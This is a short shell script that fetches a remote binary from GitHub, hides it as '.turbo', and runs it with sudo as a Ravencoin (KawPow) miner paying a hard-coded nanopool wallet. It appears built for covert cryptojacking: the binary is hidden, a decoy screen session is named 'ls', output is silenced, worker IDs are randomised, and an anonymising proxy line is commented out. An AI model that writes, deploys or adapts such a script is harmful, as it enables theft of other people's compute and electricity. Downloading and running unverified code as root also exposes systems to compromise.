#!/bin/sh
apt install screen -y
wget https://github.com/azis07/turbo/raw/main/turbo
mv turbo .turbo
chmod +x .turbo
screen -dmS ls 
POOL=rvn-us-east1.nanopool.org:12222
WALLET=RJ57iWMXV4pRY48TWU6XZk6k5yyYCYB9vE
WORKER=$(echo $(shuf -i 11111-9999999 -n 1)-GPU)
#PROXY=socks5://72.210.252.134:46164
sudo ./.turbo -a kawpow -o $POOL -u $WALLET.$WORKER > /dev/null
